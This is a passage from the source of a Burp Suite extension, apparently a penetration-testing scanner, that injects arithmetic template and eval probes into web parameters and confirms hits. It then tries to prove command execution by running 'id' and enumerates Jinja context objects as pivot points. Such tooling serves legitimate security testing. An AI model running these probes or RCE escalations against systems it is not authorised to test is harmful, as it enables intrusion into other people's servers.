        left = JPanel(FlowLayout(FlowLayout.LEFT))
        left.add(self.stats_label)
        left.add(legend)
        bar.add(left, BorderLayout.WEST)
        bar.add(author, BorderLayout.EAST)
        bar.setBorder(BorderFactory.createEmptyBorder(2, 6, 2, 6))
        return bar

    def _refresh_stats(self):
        self.stats_label.setText(
            " Monitored: %d   Confirmed: %d   Suspected: %d " % (
                self._count_monitored, self._count_confirmed,
                self._count_suspected))

    def _build_settings(self):
        panel = JPanel(BorderLayout())
        panel.setBorder(BorderFactory.createTitledBorder(
            "Code Injection Sentinel settings  (created by asad0x0)"))

        checks = JPanel(GridLayout(0, 4, 6, 4))
        self.cb_enabled = self._checkbox("Enable Extension", self._cfg.enabled)
        # platforms
        self.cb_java = self._checkbox("Platform: Java-EL", self._cfg.pf_java)
        self.cb_php = self._checkbox("Platform: PHP", self._cfg.pf_php)
        self.cb_prn = self._checkbox("Platform: Py/Ruby/Node",
                                     self._cfg.pf_pyrubynode)
        self.cb_net = self._checkbox("Platform: .NET", self._cfg.pf_dotnet)
        # param sources
        self.cb_get = self._checkbox("Enable GET", self._cfg.enable_get)
        self.cb_post = self._checkbox("Enable POST", self._cfg.enable_post)
        self.cb_json = self._checkbox("Enable JSON", self._cfg.enable_json)
        self.cb_multipart = self._checkbox("Enable Multipart",
                                           self._cfg.enable_multipart)
        self.cb_xml = self._checkbox("Enable XML", self._cfg.enable_xml)
        # behaviour
        self.cb_logging = self._checkbox("Enable Logging",
                                         self._cfg.enable_logging)
        self.cb_misses = self._checkbox("Log Misses", self._cfg.log_misses)
        self.cb_highlight = self._checkbox("Highlight Findings",
                                           self._cfg.highlight)
        self.cb_confirm = self._checkbox("Require 2-pair Confirm",
                                         self._cfg.require_confirm)
        self.cb_rce = self._checkbox("Confirm RCE on hit",
                                     self._cfg.enable_rce_confirm)
        self.cb_breakout = self._checkbox("Context Breakout",
                                          self._cfg.enable_breakout)
        self.cb_scanissues = self._checkbox("Report to Scanner",
                                            self._cfg.enable_scan_issues)
        self.cb_ctxenum = self._checkbox("Jinja Context Enum",
                                         self._cfg.enable_ctx_enum)

        for cb in (self.cb_enabled, self.cb_java, self.cb_php, self.cb_prn,
                   self.cb_net, self.cb_get, self.cb_post, self.cb_json,
                   self.cb_multipart, self.cb_xml, self.cb_logging,
                   self.cb_misses, self.cb_highlight, self.cb_confirm,
                   self.cb_rce, self.cb_breakout, self.cb_scanissues,
                   self.cb_ctxenum):
            checks.add(cb)

        fields = JPanel(GridLayout(0, 2, 6, 4))
        fields.add(JLabel("Custom template (must have __A__ & __B__):"))
        self.tf_custom = JTextField(self._cfg.custom_payload)
        fields.add(self.tf_custom)
        fields.add(JLabel("Maximum Threads (applied on reload):"))
        self.tf_threads = JTextField(str(self._cfg.max_threads))
        fields.add(self.tf_threads)
        fields.add(JLabel("Rate limit ms (min gap between requests):"))
        self.tf_rate = JTextField(str(self._cfg.rate_limit_ms))
        fields.add(self.tf_rate)
        fields.add(JLabel("Ignore Extensions (comma separated):"))
        self.tf_ignore = JTextField(",".join(self._cfg.ignore_extensions))
        fields.add(self.tf_ignore)

        buttons = JPanel(FlowLayout(FlowLayout.LEFT))
        buttons.add(JButton("Apply Settings", actionPerformed=self._apply))
        buttons.add(JButton("Scan Proxy History",
                            actionPerformed=self._scan_proxy))
        buttons.add(JButton("Scan Sitemap", actionPerformed=self._scan_sitemap))
        buttons.add(JButton("Reset (re-scan)", actionPerformed=self._reset))
        buttons.add(JButton("Clear Results", actionPerformed=self._clear))
        buttons.add(JButton("Export CSV", actionPerformed=self._export_csv))

        inner = JPanel(BorderLayout())
        inner.add(checks, BorderLayout.NORTH)
        inner.add(fields, BorderLayout.CENTER)
        inner.add(buttons, BorderLayout.SOUTH)
        panel.add(inner, BorderLayout.CENTER)
        return panel

    def _checkbox(self, label, state):
        cb = JCheckBox(label, state)
        cb.addActionListener(self._LiveToggle(self))
        return cb

    def _apply(self, event=None):
        self._sync_config()
        probes = ", ".join(p["label"] for p in build_probes(self._cfg)) or "none"
        self._logger.info("Settings applied. Active probes: %s" % probes)

    def _sync_config(self):
        c = self._cfg
        c.enabled = self.cb_enabled.isSelected()
        c.pf_java = self.cb_java.isSelected()
        c.pf_php = self.cb_php.isSelected()
        c.pf_pyrubynode = self.cb_prn.isSelected()
        c.pf_dotnet = self.cb_net.isSelected()
        c.enable_get = self.cb_get.isSelected()
        c.enable_post = self.cb_post.isSelected()
        c.enable_json = self.cb_json.isSelected()
        c.enable_multipart = self.cb_multipart.isSelected()
        c.enable_xml = self.cb_xml.isSelected()
        c.enable_logging = self.cb_logging.isSelected()
        c.log_misses = self.cb_misses.isSelected()
        c.highlight = self.cb_highlight.isSelected()
        c.require_confirm = self.cb_confirm.isSelected()
        c.enable_rce_confirm = self.cb_rce.isSelected()
        c.enable_breakout = self.cb_breakout.isSelected()
        c.enable_scan_issues = self.cb_scanissues.isSelected()
        c.enable_ctx_enum = self.cb_ctxenum.isSelected()
        c.custom_payload = self.tf_custom.getText()
        try:
            c.max_threads = max(1, int(self.tf_threads.getText().strip()))
        except Exception:
            pass
        try:
            c.rate_limit_ms = max(0, int(self.tf_rate.getText().strip()))
        except Exception:
            pass
        exts = [e.strip().lower() for e in self.tf_ignore.getText().split(",")
                if e.strip()]
        if exts:
            c.ignore_extensions = exts

    class _LiveToggle(ActionListener):
        def __init__(self, ui):
            self.ui = ui
        def actionPerformed(self, event):
            self.ui._sync_config()

    # ---- bulk scan / reset --------------------------------------------
    def _scan_proxy(self, event=None):
        self._bulk_scan(self._callbacks.getProxyHistory(), "Proxy history")

    def _scan_sitemap(self, event=None):
        self._bulk_scan(self._callbacks.getSiteMap(None), "Sitemap")

    def _bulk_scan(self, items, label):
        if self._scanner is None:
            return
        self._sync_config()
        if not self._cfg.enabled:
            self._logger.info("Extension is disabled — tick 'Enable Extension' "
                              "first.")
            return
        count = len(items) if items else 0
        self._logger.info("Scanning %s (%d items)..." % (label, count))

        def worker():
            res = self._scanner.scan_items(items, force=False)
            self._logger.info(
                "%s: %d seen -> %d testable, %d probe-requests queued." % (
                    label, res["seen"], res["tested"], res["jobs"]))
            if res["reasons"]:
                parts = ", ".join("%s=%d" % (k, v) for k, v
                                  in sorted(res["reasons"].items()))
                self._logger.info("%s skipped: %s" % (label, parts))
            if res["tested"] > 0 and not self._cfg.log_misses:
                self._logger.info("Testing runs in background — per-request "
                                  "lines appear only on a hit. Tick 'Log "
                                  "Misses' to see every probe.")
            elif res["tested"] == 0:
                self._logger.info("Nothing testable. Check Burp scope + that "
                                  "GET/POST HTML/JSON/XML requests exist, or "
                                  "use right-click 'Send to Code Injection'.")
        t = threading.Thread(target=worker, name="ci-bulk-scan")
        t.setDaemon(True)
        t.start()

    def _reset(self, event=None):
        """Clear dedup cache (so same endpoints re-scan) + wipe results."""
        if self._scanner is not None:
            self._scanner.reset_dedup()
        self._clear()
        self._logger.info("Reset done — dedup cache cleared; same endpoints "
                          "can be scanned again.")

    # ---- table actions -------------------------------------------------
    def _clear(self, event=None):
        self.model.clear()
        self._count_monitored = 0
        self._count_confirmed = 0
        self._count_suspected = 0
        self._refresh_stats()

    def _export_csv(self, event=None):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("code_injection_findings.csv"))
        if chooser.showSaveDialog(self._root) != JFileChooser.APPROVE_OPTION:
            return
        path = chooser.getSelectedFile().getAbsolutePath()
        try:
            f = open(path, "w")
            try:
                f.write(",".join(ResultsTableModel.COLUMNS + ["CVSS"]) + "\n")
                for r in self.model.all_rows():
                    cells = [r.time, r.method, r.url, r.where, r.engine,
                             r.payload, r.confidence, r.evidence, r.cwe,
                             r.severity, str(r.status), str(r.length), r.cvss]
                    f.write(",".join(['"%s"' % c.replace('"', '""')
                                      for c in cells]) + "\n")
            finally:
                f.close()
            self._logger.info("Exported %d rows to %s" %
                              (self.model.getRowCount(), path))
        except Exception:
            self._logger.error("export_csv", sys.exc_info())

    def _send_to_repeater(self, rows):
        for r in rows:
            self._repeater_counter += 1
            self._callbacks.sendToRepeater(r.host, r.port, r.https, r.request,
                                           "CI-%d" % self._repeater_counter)

    def _send_to_intruder(self, rows):
        for r in rows:
            self._callbacks.sendToIntruder(r.host, r.port, r.https, r.request)

    def _copy_url(self, rows):
        Utilities(None).copy_to_clipboard("\n".join([r.url for r in rows]))

    def _copy_request(self, rows):
        helpers = self._callbacks.getHelpers()
        Utilities(None).copy_to_clipboard("\n\n".join(
            [helpers.bytesToString(r.request) for r in rows]))

    class _TableMouse(MouseAdapter):
        def __init__(self, ui, table, model):
            self.ui = ui
            self.table = table
            self.model = model

        def _rows(self):
            out = []
            for v in self.table.getSelectedRows():
                out.append(self.model.get_row(
                    self.table.convertRowIndexToModel(v)))
            return out

        def mousePressed(self, event):
            self._maybe_popup(event)

        def mouseReleased(self, event):
            self._maybe_popup(event)

        def mouseClicked(self, event):
            if event.getClickCount() == 2:
                rows = self._rows()
                if rows:
                    self.ui._send_to_repeater(rows)

        def _maybe_popup(self, event):
            if not event.isPopupTrigger():
                return
            row = self.table.rowAtPoint(event.getPoint())
            if row >= 0 and not self.table.isRowSelected(row):
                self.table.setRowSelectionInterval(row, row)
            self._popup().show(event.getComponent(), event.getX(), event.getY())

        def _popup(self):
            ui, mouse = self.ui, self
            menu = JPopupMenu()

            def item(label, handler):
                mi = JMenuItem(label)
                mi.addActionListener(mouse._Handler(mouse, handler))
                return mi

            menu.add(item("Send to Repeater",
                          lambda rows: ui._send_to_repeater(rows)))
            menu.add(item("Send to Intruder",
                          lambda rows: ui._send_to_intruder(rows)))
            menu.add(item("Copy URL", lambda rows: ui._copy_url(rows)))
            menu.add(item("Copy Request", lambda rows: ui._copy_request(rows)))
            menu.addSeparator()
            menu.add(item("Clear Results", lambda rows: ui._clear()))
            menu.add(item("Export CSV", lambda rows: ui._export_csv()))
            return menu

        class _Handler(ActionListener):
            def __init__(self, mouse, fn):
                self.mouse = mouse
                self.fn = fn
            def actionPerformed(self, event):
                self.fn(self.mouse._rows())

    # ---- thread-safe UI updates ---------------------------------------
    def inc_monitored(self):
        def _do():
            self._count_monitored += 1
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def add_finding(self, result_row):
        def _do():
            self.model.add_row(result_row)
            if result_row.confidence == "CONFIRMED":
                self._count_confirmed += 1
            else:
                self._count_suspected += 1
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def annotate_rce(self, result_row, snippet, payload):
        def _do():
            if "+RCE" not in result_row.engine:
                result_row.engine += "  [+RCE]"
            result_row.payload = payload
            result_row.evidence = "RCE: " + snippet
            if CWE_OS not in result_row.cwe:
                result_row.cwe = (result_row.cwe + " + " + CWE_OS).strip(" +")
            self.model.update_row(result_row)
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def annotate_ctx(self, result_row, present):
        def _do():
            if "[ctx]" not in result_row.engine:
                result_row.engine += "  [ctx:manual]"
            result_row.evidence = (result_row.evidence
                                   + " | ctx: " + ", ".join(present))
            self.model.update_row(result_row)
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def append_log(self, text):
        def _do():
            self.log_area.append(text + "\n")
            self.log_area.setCaretPosition(
                self.log_area.getDocument().getLength())
        SwingUtilities.invokeLater(_do)


# ===========================================================================
#  Scanner : worker pool + math-oracle flow
# ===========================================================================
class Scanner(object):

    def __init__(self, callbacks, helpers, config, utils, parser, builder,
                 detector, logger, ui):
        self._callbacks = callbacks
        self._helpers = helpers
        self._cfg = config
        self._utils = utils
        self._parser = parser
        self._builder = builder
        self._detector = detector
        self._logger = logger
        self._ui = ui

        self._queue = Queue.Queue()
        self._workers = []
        self._running = True

        self._tested = set()
        self._tested_lock = threading.Lock()

        self._rl_lock = threading.Lock()
        self._last_request = 0.0

    def start(self):
        for i in range(self._cfg.max_threads):
            t = threading.Thread(target=self._worker_loop,
                                 name="ci-worker-%d" % i)
            t.setDaemon(True)
            t.start()
            self._workers.append(t)
        self._logger.info("Started %d worker thread(s)." % len(self._workers))

    def stop(self):
        self._running = False
        for _ in self._workers:
            self._queue.put(None)

    # ---- from the HTTP listener ---------------------------------------
    def schedule(self, message_info, force=False):
        """
        Queue a request for scanning. force=True (manual "Send to Code
        Injection") bypasses the scope, static-extension and MIME gates so an
        explicitly chosen request is always tested.
        """
        request = message_info.getRequest()
        response = message_info.getResponse()
        if request is None or response is None:
            return 0, "no-response"

        req_info = self._helpers.analyzeRequest(message_info)
        method = req_info.getMethod()
        url = req_info.getUrl()

        if not force:
            if not self._callbacks.isInScope(url):
                return 0, "out-of-scope"
            if self._utils.has_ignored_extension(url, self._cfg.ignore_extensions):
                return 0, "static-ext"
        if method not in ("GET", "POST"):
            return 0, "bad-method"
        if not force and not self._is_testable_response(response):
            return 0, "not-testable-mime"

        probes = build_probes(self._cfg)
        if not probes:
            return 0, "no-probes-enabled"

        self._ui.inc_monitored()

        path = url.getPath()
        baseline_body = self._detector.body_str(response)
        service = message_info.getHttpService()
        dotnet = self._cfg.pf_dotnet

        jobs = 0
        for desc in self._parser.parse(request, req_info, method):
            for probe in probes:
                key = "%s|%s|%s|%s|%s" % (
                    method, path, desc["kind"], desc["name"], probe["id"])
                if self._already_tested(key):
                    continue
                self._queue.put({
                    "request": request, "desc": desc, "probe": probe,
                    "method": method, "path": path, "url": url.toString(),
                    "service": service, "message_info": message_info,
                    "baseline_body": baseline_body, "dotnet": dotnet,
                })
                jobs += 1

        if jobs == 0:
            return 0, "no-params-or-deduped"
        return jobs, "ok"

    def scan_items(self, items, force=False):
        """
        Queue a batch of IHttpRequestResponse items (Proxy history, Sitemap, or
        manually sent). Returns a breakdown dict so the caller can report how
        many were actually testable vs skipped and why.
        """
        res = {"seen": 0, "tested": 0, "jobs": 0, "reasons": {}}
        if not items:
            return res
        for it in items:
            try:
                jn, reason = self.schedule(it, force=force)
            except Exception:
                self._logger.error("scan_items", sys.exc_info())
                continue
            res["seen"] += 1
            if reason == "ok":
                res["tested"] += 1
                res["jobs"] += jn
            else:
                res["reasons"][reason] = res["reasons"].get(reason, 0) + 1
        return res

    def reset_dedup(self):
        """Forget every tested endpoint so the same ones can be scanned again."""
        with self._tested_lock:
            self._tested = set()

    def _is_testable_response(self, response):
        info = self._helpers.analyzeResponse(response)
        mime = info.getStatedMimeType() or info.getInferredMimeType() or ""
        return mime in self._cfg.testable_mimes

    def _already_tested(self, key):
        with self._tested_lock:
            if key in self._tested:
                return True
            self._tested.add(key)
            return False

    def _worker_loop(self):
        while self._running:
            job = self._queue.get()
            try:
                if job is None:
                    break
                self._process(job)
            except Exception:
                self._logger.error("worker", sys.exc_info())
            finally:
                self._queue.task_done()

    def _rate_limit(self):
        gap = self._cfg.rate_limit_ms / 1000.0
        with self._rl_lock:
            wait = self._last_request + gap - time.time()
            if wait > 0:
                time.sleep(wait)
            self._last_request = time.time()

    def _send(self, service, request_bytes):
        self._rate_limit()
        try:
            rr = self._callbacks.makeHttpRequest(service, request_bytes)
            return rr.getResponse() if rr is not None else None
        except Exception:
            self._logger.error("makeHttpRequest", sys.exc_info())
            return None

    def _report_issue(self, url_str, srv, where, probe, confidence, cwe,
                      severity_label, cvss, payload, evidence,
                      poc_request, poc_response):
        """Push the finding into Burp's Target -> Issues so Burp's own report
        generator includes it (High / Certain|Firm, with CWE + CVSS detail)."""
        if not self._cfg.enable_scan_issues:
            return
        try:
            msg = HttpReqResp(srv, poc_request, poc_response)
            burp_conf = "Certain" if confidence == "CONFIRMED" else "Firm"
            detail = (
                "<b>Confidence:</b> " + confidence + "<br>"
                "<b>Injection point:</b> " + where + "<br>"
                "<b>Engine / payload class:</b> " + probe["label"] + "<br>"
                "<b>Payload:</b> <code>" + payload + "</code><br>"
                "<b>Evidence:</b> " + evidence + "<br>"
                "<b>CWE:</b> " + cwe + "<br>"
                "<b>Severity:</b> " + severity_label + "<br>"
                "<b>CVSS:</b> " + cvss)
            issue = CustomScanIssue(
                JURL(url_str), srv, [msg],
                "Server-Side Code Injection (" + cwe + ")",
                detail, "High", burp_conf)
            self._callbacks.addScanIssue(issue)
        except Exception:
            self._logger.error("addScanIssue", sys.exc_info())

    def _try_rce_confirm(self, job, desc, baseline, where, row, platform):
        """On a CONFIRMED finding (PHP or Py/Ruby/Node), try to prove real
        command execution by running `id` and matching uid=..gid=.. in the
        response. Annotates the existing row; never creates false positives
        (two-anchor regex + not in baseline). Fires the platform's breakout
        variants, stops at first proof."""
        de = self._detector
        regexes = RCE_REGEX_BY_PLATFORM.get(platform, [RCE_UID_RE])
        base = baseline or ""
        # only use regexes whose proof is NOT already on the page (stay clean)
        regexes = [rx for rx in regexes if not rx.search(base)]
        if not regexes:
            return False
        for payload in RCE_PAYLOADS_BY_PLATFORM.get(platform, []):
            inj = self._builder.build(job["request"], desc, payload)
            if inj is None:
                continue
            resp = self._send(job["service"], inj)
            if resp is None:
                continue
            body = de.body_str(resp)
            m = None
            for rx in regexes:
                m = rx.search(body)
                if m:
                    break
            if m:
                snippet = body[m.start():m.start() + 80].replace("\n", " ")
                self._ui.annotate_rce(row, snippet, payload)
                # keep the PoC that proved RCE
                row.request = inj
                row.response = resp
                self._logger.info(
                    "RCE CONFIRMED (id) | %s | Where: %s | Output: %s" % (
                        job["url"], where, snippet))
                if self._cfg.highlight:
                    try:
                        mi = job["message_info"]
                        mi.setHighlight("red")
                        mi.setComment("RCE via code injection (id) | Where: %s"
                                      % where)
                    except Exception:
                        pass
                return True   # one proof is enough
        return False

    def _enum_context(self, job, desc, where, row):
        """CONFIRMED sandboxed Jinja SSTI: enumerate which app/framework
        context objects are present (via `is defined`, which never errors) so
        the tester knows which object to pivot through manually. Reports the
        present objects on the row + log; does NOT attempt exploitation."""
        payload = "".join("CIEN_%s_{{ %s is defined }}_" % (n, n)
                          for n in CTX_ENUM_NAMES)
        inj = self._builder.build(job["request"], desc, payload)
        if inj is None:
            return
        resp = self._send(job["service"], inj)
        if resp is None:
            return
        body = self._detector.body_str(resp)
        present = []
        for name, val in CTX_ENUM_RE.findall(body):
            if val == "True" and name not in present:
                present.append(name)
        if present:
            self._ui.annotate_ctx(row, present)
            self._logger.info(
                "Sandboxed SSTI context objects present: %s | %s | Where: %s "
                "-> pivot manually through one of these (e.g. parse_raw / ORM "
                "session / config)" % (", ".join(present), job["url"], where))

    def _process(self, job):
        probe = job["probe"]
        desc = job["desc"]
        de = self._detector
        baseline = job["baseline_body"]
        where = "%s (%s)" % (desc["name"], desc["kind"])

        # ---- pair 1 -------------------------------------------------------
        # pick operands whose product is NOT already in the baseline; regenerate
        # on collision instead of skipping the param outright
        fo1 = de.fresh_operands(baseline, job["dotnet"])
        if fo1 is None:
            return
        a1, b1, product1, needles1 = fo1

        payload1 = _tpl_build(probe["template"], a1, b1)
        inj1 = self._builder.build(job["request"], desc, payload1)
        if inj1 is None:
            return
        resp1 = self._send(job["service"], inj1)
        if resp1 is None:
            return
        body1 = de.body_str(resp1)
        status1, length1 = de.status_length(resp1)
        hit1 = de.found(body1, needles1)

        self._logger.log_probe(self._utils.now(), job["method"], job["url"],
                               where, probe["label"], status1, length1, hit1)
        if not hit1:
            return

        # ---- pair 2 (confirmation) ---------------------------------------
        confidence = "SUSPECTED"
        poc_request, poc_response = inj1, resp1
        poc_status, poc_length = status1, length1
        poc_payload, poc_product = payload1, product1

        if self._cfg.require_confirm:
            # second pair with a different product, also absent from baseline
            fo2 = de.fresh_operands(baseline, job["dotnet"], avoid=product1)
            if fo2 is not None:
                a2, b2, product2, needles2 = fo2
                payload2 = _tpl_build(probe["template"], a2, b2)
                inj2 = self._builder.build(job["request"], desc, payload2)
                if inj2 is not None:
                    resp2 = self._send(job["service"], inj2)
                    if resp2 is not None and de.found(de.body_str(resp2),
                                                      needles2):
                        confidence = "CONFIRMED"
                        poc_request, poc_response = inj2, resp2
                        poc_status, poc_length = de.status_length(resp2)
                        poc_payload, poc_product = payload2, product2
        else:
            confidence = "CONFIRMED"

        srv = job["service"]
        row = ResultRow(
            self._utils.now(), job["method"], job["url"], where,
            probe["label"], confidence, poc_status, poc_length,
            poc_request, poc_response,
            srv.getHost(), srv.getPort(), srv.getProtocol() == "https",
            payload=poc_payload, evidence="product=%d in body" % poc_product,
            cwe=cwe_for(probe),
            severity=score_for(confidence)[0], cvss=score_for(confidence)[1])
        self._ui.add_finding(row)

        self._logger.info("%s code injection | %s | Where: %s | Engine: %s" % (
            confidence, job["url"], where, probe["label"]))

        self._report_issue(
            job["url"], srv, where, probe, confidence, cwe_for(probe),
            score_for(confidence)[0], score_for(confidence)[1],
            poc_payload, "product=%d in body" % poc_product,
            poc_request, poc_response)

        # eval -> RCE escalation (CONFIRMED only, platforms with a command set)
        pf = probe.get("platform")
        rce_ok = False
        if (self._cfg.enable_rce_confirm and confidence == "CONFIRMED"
                and pf in RCE_PAYLOADS_BY_PLATFORM):
            rce_ok = self._try_rce_confirm(job, desc, baseline, where, row, pf)

        # sandboxed Jinja SSTI (generic RCE gadgets failed) -> enumerate context
        if (self._cfg.enable_ctx_enum and confidence == "CONFIRMED"
                and pf == "pyrubynode" and not rce_ok):
            self._enum_context(job, desc, where, row)

        if self._cfg.highlight:
            try:
                mi = job["message_info"]
                mi.setHighlight("red" if confidence == "CONFIRMED" else "orange")
                mi.setComment("%s code injection (%s) | Where: %s" % (
                    confidence, probe["label"], where))
            except Exception:
                pass


# ===========================================================================
#  BurpExtender
# ===========================================================================
# ===========================================================================
#  Burp Scanner issue integration (report findings into Target -> Issues)
# ===========================================================================
class HttpReqResp(IHttpRequestResponse):
    """Minimal IHttpRequestResponse holder so a finding's PoC request/response
    can be attached to a Scanner issue without re-sending anything."""

    def __init__(self, service, request, response):
        self._service = service
        self._request = request
        self._response = response
        self._comment = None
        self._highlight = None

    def getRequest(self):
        return self._request

    def getResponse(self):
        return self._response

    def getHttpService(self):
        return self._service

    def setRequest(self, message):
        self._request = message

    def setResponse(self, message):
        self._response = message

    def setHttpService(self, httpService):
        self._service = httpService

    def getComment(self):
        return self._comment

    def setComment(self, comment):
        self._comment = comment

    def getHighlight(self):
        return self._highlight

    def setHighlight(self, color):
        self._highlight = color


class CustomScanIssue(IScanIssue):
    """Custom Burp Scanner issue for a confirmed/suspected code injection."""

    def __init__(self, url, service, messages, name, detail, severity,
                 confidence):
        self._url = url
        self._service = service
        self._messages = messages
        self._name = name
        self._detail = detail
        self._severity = severity        # "High" / "Medium" / ...
        self._confidence = confidence     # "Certain" / "Firm" / "Tentative"

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0x08000000      # custom issue type

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return ("The application evaluates attacker-controlled input as "
                "server-side code or a template expression. This was proven "
                "with a math oracle: a random product injected as an "
                "expression was computed and returned by the server.")

    def getRemediationBackground(self):
        return ("Do not pass untrusted input into eval/exec or template "
                "sources. Use a sandboxed, logic-less template engine and "
                "strict input validation / allow-listing.")

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return jarray_array(self._messages, IHttpRequestResponse)

    def getHttpService(self):
        return self._service


class BurpExtender(IBurpExtender, IHttpListener, IExtensionStateListener,
                   IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Code Injection Sentinel")

        stdout = PrintWriter(callbacks.getStdout(), True)

        self._cfg = Config()
        self._utils = Utilities(self._helpers)
        self._logger = Logger(stdout, self._cfg)
        self._parser = ParameterParser(self._helpers, self._utils, self._cfg)
        self._builder = RequestBuilder(self._helpers, self._utils, self._cfg)
        self._detector = DetectionEngine(self._helpers, self._cfg)

        self._ui = ExtensionUI(callbacks, self._cfg, self._logger)
        self._logger.attach_ui(self._ui)

        self._scanner = Scanner(callbacks, self._helpers, self._cfg,
                                self._utils, self._parser, self._builder,
                                self._detector, self._logger, self._ui)
        self._ui.set_scanner(self._scanner)

        callbacks.addSuiteTab(self._ui)
        callbacks.registerHttpListener(self)
        callbacks.registerExtensionStateListener(self)
        callbacks.registerContextMenuFactory(self)

        self._scanner.start()
        self._logger.info("Code Injection Sentinel loaded (created by asad0x0). "
                          "Output-based math oracle, no blind. Browse in-scope "
                          "targets through Proxy to begin.")

    # ---- IContextMenuFactory ------------------------------------------
    def createMenuItems(self, invocation):
        menu = ArrayList()
        item = JMenuItem("Send to Code Injection")
        item.addActionListener(
            self._SendToCI(self._scanner, self._logger, invocation))
        menu.add(item)
        return menu

    class _SendToCI(ActionListener):
        """Right-click handler: force-scan the selected request(s)."""
        def __init__(self, scanner, logger, invocation):
            self._scanner = scanner
            self._logger = logger
            self._invocation = invocation

        def actionPerformed(self, event):
            msgs = self._invocation.getSelectedMessages()
            if not msgs:
                return
            items = list(msgs)

            def worker():
                res = self._scanner.scan_items(items, force=True)
                self._logger.info(
                    "Send to Code Injection: %d seen -> %d testable, %d "
                    "probe-requests queued (scope/MIME bypassed)." % (
                        res["seen"], res["tested"], res["jobs"]))
            t = threading.Thread(target=worker, name="ci-send-to")
            t.setDaemon(True)
            t.start()

    # ---- IHttpListener ------------------------------------------------
    def processHttpMessage(self, tool_flag, message_is_request, message_info):
        try:
            if not self._cfg.enabled:
                return
            if message_is_request:
                return
            if tool_flag != self._callbacks.TOOL_PROXY:
                return
            self._scanner.schedule(message_info)
        except Exception:
            self._logger.error("processHttpMessage", sys.exc_info())

    def extensionUnloaded(self):
        try:
            self._scanner.stop()
            self._logger.info("Code Injection Sentinel unloaded. Workers stopped.")
        except Exception:
            pass
